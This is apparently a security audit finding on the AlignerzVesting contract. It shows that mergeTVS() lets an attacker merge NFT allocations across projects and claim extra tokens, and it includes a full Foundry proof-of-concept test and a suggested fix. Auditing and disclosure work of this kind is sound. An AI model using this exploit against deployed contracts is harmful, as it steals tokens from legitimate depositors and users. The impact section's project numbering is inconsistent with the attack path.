# [000698] Cross-Project NFT Merge Enables Token Theft and Project Accounting Corruption
  
  ### Summary

The missing validation that `projectIds[i] == projectId` in `mergeTVS()` will cause token theft and project accounting corruption for legitimate users and project depositors as an attacker will merge NFT allocations from different projects into a single NFT, allowing them to claim more tokens than their legitimate allocation in any single project.


### Root Cause


In [AlignerzVesting.sol:1002-1048](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1002-L1048) the `mergeTVS()` function accepts a `projectId` parameter for the merged NFT and a `projectIds[]` array for NFTs to merge, but never validates that all `projectIds[i]` equal the main `projectId` parameter.

```solidity
function mergeTVS(uint256 projectId, uint256 mergedNftId, uint256[] calldata projectIds, uint256[] calldata nftIds) external returns(uint256) {
    // ...
    // Uses main projectId to get mergedTVS allocation
    (Allocation storage mergedTVS, IERC20 token) = isBiddingProject ?
    (biddingProjects[projectId].allocations[mergedNftId], biddingProjects[projectId].token) :
    (rewardProjects[projectId].allocations[mergedNftId], rewardProjects[projectId].token);

    // ...

    // @audit No validation that projectIds[i] == projectId!
    for (uint256 i; i < nbOfNFTs; i++) {
        feeAmount += _merge(mergedTVS, projectIds[i], nftIds[i], token);  // Uses different projectIds[i]!
    }
}
```

The protocol lacks a mapping from NFT ID to Project ID. It only tracks whether an NFT belongs to a bidding or reward project (`NFTBelongsToBiddingProject[nftId]`), but not which specific project. This creates a trust boundary violation where users can provide incorrect `projectId` values.

### Internal Pre-conditions

1. Two or more projects need to be created using the same ERC20 token
2. Attacker needs to have NFT allocations in multiple projects that use the same token
3. Merge functionality needs to be enabled (C-01 uninitialized array bug needs to be fixed first)


### External Pre-conditions

None required.


### Attack Path

1. Project 0 (P1) deposits 100,000 tokens to cover allocations: attacker (50,000) + victim (50,000)
2. Project 1 (P2) deposits 100,000 tokens to cover allocations: attacker (50,000) + other users (50,000)
3. Attacker claims NFT #1 from Project 0 with 50,000 token allocation
4. Attacker claims NFT #2 from Project 1 with 50,000 token allocation
5. Attacker calls `mergeTVS(projectId=0, mergedNftId=1, projectIds=[1], nftIds=[2])`
6. NFT #1's allocation in Project 0 now contains 100,000 tokens (original 50k + merged 50k from P2)
7. NFT #2 is burned
8. Attacker calls `claimTokens(projectId=0, nftId=1)` and receives 100,000 tokens
9. Project 0 paid out 150,000 tokens (attacker 100k + victim 50k) despite only depositing 100,000 tokens


### Impact

The affected parties suffer the following impacts:

1. Token Theft: Attacker steals 50,000 tokens by claiming more than their legitimate allocation in Project 1. The extra tokens come from Project 2's pool.

2. Project Accounting Corruption: Project 1 pays out 150% of its deposited tokens (150,000 claimed vs 100,000 deposited). The 50,000 token shortfall is covered by Project 2's surplus.

3. Cross-Project Subsidy: Project 2 depositors effectively subsidize Project 1 claims without consent. If Project 2 had additional users, they may be unable to claim their full allocations.

4. Potential Insolvency: In scenarios with many projects and overlapping attackers, the contract could become globally insolvent, leaving legitimate users unable to claim.


### PoC

Save this POC to `protocol/test/C07_CrossProjectNFTMerge.t.sol`

Run with:
```bash
forge test --match-contract C07_CrossProjectNFTMergeTest -vvv
```

### POC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {CompleteMerkle} from "murky/src/CompleteMerkle.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IAlignerzNFT} from "../src/interfaces/IAlignerzNFT.sol";

contract AlignerzVestingPatchedC01 is AlignerzVesting {
    using SafeERC20 for IERC20;

    function calculateFeeAndNewAmountForOneTVS_FIXED(
        uint256 feeRate,
        uint256[] memory amounts,
        uint256 length
    ) public pure returns (uint256 feeAmount, uint256[] memory newAmounts) {
        newAmounts = new uint256[](length);
        for (uint256 i; i < length; i++) {
            uint256 fee = calculateFeeAmount(feeRate, amounts[i]);
            feeAmount += fee;
            newAmounts[i] = amounts[i] - fee;
        }
    }

    function mergeTVS_PATCHED(
        uint256 projectId,
        uint256 mergedNftId,
        uint256[] calldata projectIds,
        uint256[] calldata nftIds
    ) external returns (uint256) {
        address nftOwner = nftContract.extOwnerOf(mergedNftId);
        require(msg.sender == nftOwner, Caller_Should_Own_The_NFT());

        bool isBiddingProject = NFTBelongsToBiddingProject[mergedNftId];
        (Allocation storage mergedTVS, IERC20 token) = isBiddingProject
            ? (biddingProjects[projectId].allocations[mergedNftId], biddingProjects[projectId].token)
            : (rewardProjects[projectId].allocations[mergedNftId], rewardProjects[projectId].token);

        uint256[] memory amounts = mergedTVS.amounts;
        uint256 nbOfFlows = mergedTVS.amounts.length;
        (uint256 feeAmount, uint256[] memory newAmounts) = calculateFeeAndNewAmountForOneTVS_FIXED(
            mergeFeeRate,
            amounts,
            nbOfFlows
        );
        mergedTVS.amounts = newAmounts;

        uint256 nbOfNFTs = nftIds.length;
        require(nbOfNFTs > 0, Not_Enough_TVS_To_Merge());
        require(nbOfNFTs == projectIds.length, Array_Lengths_Must_Match());

        for (uint256 i; i < nbOfNFTs; i++) {
            feeAmount += _merge_PATCHED(mergedTVS, projectIds[i], nftIds[i], token);
        }
        if (feeAmount > 0) {
            token.safeTransfer(treasury, feeAmount);
        }
        emit TVSsMerged(
            projectId,
            isBiddingProject,
            nftIds,
            mergedNftId,
            mergedTVS.amounts,
            mergedTVS.vestingPeriods,
            mergedTVS.vestingStartTimes,
            mergedTVS.claimedSeconds,
            mergedTVS.claimedFlows
        );
        return mergedNftId;
    }

    function _merge_PATCHED(
        Allocation storage mergedTVS,
        uint256 projectId,
        uint256 nftId,
        IERC20 token
    ) internal returns (uint256 feeAmount) {
        require(msg.sender == nftContract.extOwnerOf(nftId), Caller_Should_Own_The_NFT());

        bool isBiddingProjectTVSToMerge = NFTBelongsToBiddingProject[nftId];
        (Allocation storage TVSToMerge, IERC20 tokenToMerge) = isBiddingProjectTVSToMerge
            ? (biddingProjects[projectId].allocations[nftId], biddingProjects[projectId].token)
            : (rewardProjects[projectId].allocations[nftId], rewardProjects[projectId].token);
        require(address(token) == address(tokenToMerge), Different_Tokens());

        uint256 nbOfFlowsTVSToMerge = TVSToMerge.amounts.length;
        for (uint256 j = 0; j < nbOfFlowsTVSToMerge; j++) {
            uint256 fee = calculateFeeAmount(mergeFeeRate, TVSToMerge.amounts[j]);
            mergedTVS.amounts.push(TVSToMerge.amounts[j] - fee);
            mergedTVS.vestingPeriods.push(TVSToMerge.vestingPeriods[j]);
            mergedTVS.vestingStartTimes.push(TVSToMerge.vestingStartTimes[j]);
            mergedTVS.claimedSeconds.push(TVSToMerge.claimedSeconds[j]);
            mergedTVS.claimedFlows.push(TVSToMerge.claimedFlows[j]);
            feeAmount += fee;
        }
        nftContract.burn(nftId);
    }
}

contract C07_CrossProjectNFTMergeTest is Test {
    AlignerzVestingPatchedC01 public vesting;
    Aligners26 public token;
    AlignerzNFT public nft;
    MockUSD public stablecoin;

    address public owner;
    address public attacker;
    address public victim;
    address public treasury;

    uint256 constant TOKEN_ALLOCATION_P1 = 100_000 ether;
    uint256 constant TOKEN_ALLOCATION_P2 = 100_000 ether;
    uint256 constant ATTACKER_ALLOCATION = 50_000 ether;
    uint256 constant VICTIM_ALLOCATION = 50_000 ether;
    uint256 constant VESTING_PERIOD = 90 days;

    uint256 public project1Id;
    uint256 public project2Id;
    uint256 public attackerNft1;
    uint256 public attackerNft2;
    uint256 public victimNft;

    function setUp() public {
        owner = address(this);
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        treasury = makeAddr("treasury");

        stablecoin = new MockUSD();
        token = new Aligners26("A26Z Token", "A26Z");
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        AlignerzVestingPatchedC01 impl = new AlignerzVestingPatchedC01();
        bytes memory initData = abi.encodeCall(AlignerzVesting.initialize, (address(nft)));
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        vesting = AlignerzVestingPatchedC01(payable(address(proxy)));

        nft.addMinter(address(vesting));
        vesting.setTreasury(treasury);
        vesting.setVestingPeriodDivisor(1);
        vesting.setMergeFeeRate(0);

        stablecoin.mint(attacker, 1_000_000e6);
        stablecoin.mint(victim, 1_000_000e6);

        token.approve(address(vesting), type(uint256).max);
    }

    function _setupTwoProjectsWithSameToken() internal {
        vesting.launchBiddingProject(
            address(token),
            address(stablecoin),
            block.timestamp,
            block.timestamp + 30 days,
            bytes32(0),
            false
        );
        project1Id = 0;

        vesting.launchBiddingProject(
            address(token),
            address(stablecoin),
            block.timestamp,
            block.timestamp + 30 days,
            bytes32(0),
            false
        );
        project2Id = 1;

        vesting.createPool(project1Id, TOKEN_ALLOCATION_P1, 1 ether, false);
        vesting.createPool(project2Id, TOKEN_ALLOCATION_P2, 1 ether, false);
    }

    function _setupBidsAndFinalize() internal {
        address dummyUser = makeAddr("dummyUser");
        stablecoin.mint(dummyUser, 1_000_000e6);

        vm.startPrank(attacker);
        stablecoin.approve(address(vesting), type(uint256).max);
        vesting.placeBid(project1Id, 50_000e6, VESTING_PERIOD);
        vesting.placeBid(project2Id, 50_000e6, VESTING_PERIOD);
        vm.stopPrank();

        vm.startPrank(victim);
        stablecoin.approve(address(vesting), type(uint256).max);
        vesting.placeBid(project1Id, 50_000e6, VESTING_PERIOD);
        vm.stopPrank();

        vm.startPrank(dummyUser);
        stablecoin.approve(address(vesting), type(uint256).max);
        vesting.placeBid(project2Id, 50_000e6, VESTING_PERIOD);
        vm.stopPrank();

        bytes32[] memory combinedLeavesP1 = new bytes32[](2);
        combinedLeavesP1[0] = keccak256(abi.encodePacked(attacker, ATTACKER_ALLOCATION, project1Id, uint256(0)));
        combinedLeavesP1[1] = keccak256(abi.encodePacked(victim, VICTIM_ALLOCATION, project1Id, uint256(0)));
        CompleteMerkle m1c = new CompleteMerkle();
        bytes32 rootP1 = m1c.getRoot(combinedLeavesP1);

        bytes32[] memory leavesP2 = new bytes32[](2);
        leavesP2[0] = keccak256(abi.encodePacked(attacker, ATTACKER_ALLOCATION, project2Id, uint256(0)));
        leavesP2[1] = keccak256(abi.encodePacked(dummyUser, VICTIM_ALLOCATION, project2Id, uint256(0)));
        CompleteMerkle m2 = new CompleteMerkle();
        bytes32 rootP2 = m2.getRoot(leavesP2);

        bytes32[] memory rootsP1 = new bytes32[](1);
        rootsP1[0] = rootP1;
        vesting.finalizeBids(project1Id, bytes32(0), rootsP1, 365 days);

        bytes32[] memory rootsP2 = new bytes32[](1);
        rootsP2[0] = rootP2;
        vesting.finalizeBids(project2Id, bytes32(0), rootsP2, 365 days);

        bytes32[] memory proofAttackerP1 = m1c.getProof(combinedLeavesP1, 0);
        vm.prank(attacker);
        attackerNft1 = vesting.claimNFT(project1Id, 0, ATTACKER_ALLOCATION, proofAttackerP1);

        bytes32[] memory proofAttackerP2 = m2.getProof(leavesP2, 0);
        vm.prank(attacker);
        attackerNft2 = vesting.claimNFT(project2Id, 0, ATTACKER_ALLOCATION, proofAttackerP2);

        bytes32[] memory proofVictim = m1c.getProof(combinedLeavesP1, 1);
        vm.prank(victim);
        victimNft = vesting.claimNFT(project1Id, 0, VICTIM_ALLOCATION, proofVictim);
    }

    function test_CrossProjectMerge_TokenTheft() public {
        _setupTwoProjectsWithSameToken();
        _setupBidsAndFinalize();

        uint256 contractBalanceBefore = token.balanceOf(address(vesting));
        assertEq(contractBalanceBefore, 200_000 ether);

        uint256 attackerP1AllocationBefore = ATTACKER_ALLOCATION;
        assertEq(attackerP1AllocationBefore, 50_000 ether);

        uint256[] memory projectIds = new uint256[](1);
        projectIds[0] = project2Id;

        uint256[] memory nftIds = new uint256[](1);
        nftIds[0] = attackerNft2;

        vm.prank(attacker);
        vesting.mergeTVS_PATCHED(project1Id, attackerNft1, projectIds, nftIds);

        vm.warp(block.timestamp + VESTING_PERIOD + 1);

        uint256 attackerBalanceBefore = token.balanceOf(attacker);

        vm.prank(attacker);
        vesting.claimTokens(project1Id, attackerNft1);

        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        uint256 attackerClaimed = attackerBalanceAfter - attackerBalanceBefore;

        assertEq(attackerClaimed, 100_000 ether);

        uint256 attackerP1AllocationAfterMerge = attackerClaimed;
        assertEq(
            attackerP1AllocationAfterMerge,
            attackerP1AllocationBefore * 2,
            "Attacker doubled their P1 allocation by merging from P2"
        );

        uint256 p1TotalDeposit = TOKEN_ALLOCATION_P1;
        uint256 p1LegitimateObligations = ATTACKER_ALLOCATION + VICTIM_ALLOCATION;
        assertEq(p1TotalDeposit, p1LegitimateObligations, "P1 deposit exactly covers legitimate obligations");

        uint256 attackerClaimedFromP1 = attackerClaimed;
        assertGt(
            attackerClaimedFromP1,
            ATTACKER_ALLOCATION,
            "Attacker claimed more than their legitimate P1 allocation"
        );

        uint256 tokensStolen = attackerClaimedFromP1 - ATTACKER_ALLOCATION;
        assertEq(tokensStolen, 50_000 ether, "Attacker stole 50k by merging cross-project");
    }

    function test_CrossProjectMerge_CorruptsProjectAccounting() public {
        _setupTwoProjectsWithSameToken();
        _setupBidsAndFinalize();

        uint256 p1Deposit = TOKEN_ALLOCATION_P1;
        uint256 p1OriginalObligations = ATTACKER_ALLOCATION + VICTIM_ALLOCATION;
        assertEq(p1Deposit, p1OriginalObligations, "P1 deposit covers its obligations");

        uint256[] memory projectIds = new uint256[](1);
        projectIds[0] = project2Id;
        uint256[] memory nftIds = new uint256[](1);
        nftIds[0] = attackerNft2;

        vm.prank(attacker);
        vesting.mergeTVS_PATCHED(project1Id, attackerNft1, projectIds, nftIds);

        uint256 p1NewObligations = (ATTACKER_ALLOCATION + ATTACKER_ALLOCATION) + VICTIM_ALLOCATION;
        assertEq(p1NewObligations, 150_000 ether, "P1 now owes 150k after cross-project merge");

        uint256 p1Shortfall = p1NewObligations - p1Deposit;
        assertEq(p1Shortfall, 50_000 ether, "P1 has 50k shortfall - cannot fulfill all claims");

        vm.warp(block.timestamp + VESTING_PERIOD + 1);

        vm.prank(attacker);
        vesting.claimTokens(project1Id, attackerNft1);

        vm.prank(victim);
        vesting.claimTokens(project1Id, victimNft);

        uint256 attackerBalance = token.balanceOf(attacker);
        uint256 victimBalance = token.balanceOf(victim);

        assertEq(attackerBalance, 100_000 ether, "Attacker got 100k");
        assertEq(victimBalance, 50_000 ether, "Victim got 50k");

        uint256 totalClaimedFromP1 = attackerBalance + victimBalance;
        assertEq(totalClaimedFromP1, 150_000 ether, "Total claimed exceeds P1 deposit of 100k");
        assertGt(totalClaimedFromP1, p1Deposit, "P1 paid out more than it deposited");
    }
}

```

Note: The test uses `AlignerzVestingPatchedC01` which fixes the C-01 uninitialized array bug to demonstrate this vulnerability. Once C-01 is fixed, C-07 becomes exploitable.

### Mitigation


Add validation in `mergeTVS()` to ensure all NFTs being merged belong to the same project:

```solidity
function mergeTVS(uint256 projectId, uint256 mergedNftId, uint256[] calldata projectIds, uint256[] calldata nftIds) external returns(uint256) {
    // ... existing code ...

    for (uint256 i; i < nbOfNFTs; i++) {
        // Add this validation
        require(projectIds[i] == projectId, "All NFTs must belong to the same project");
        feeAmount += _merge(mergedTVS, projectIds[i], nftIds[i], token);
    }
    // ...
}
```

Alternatively, implement a mapping from NFT ID to Project ID (`mapping(uint256 => uint256) public nftToProjectId`) and validate against it during merge operations. This would provide stronger guarantees as it wouldn't rely on user-provided `projectIds` array.

  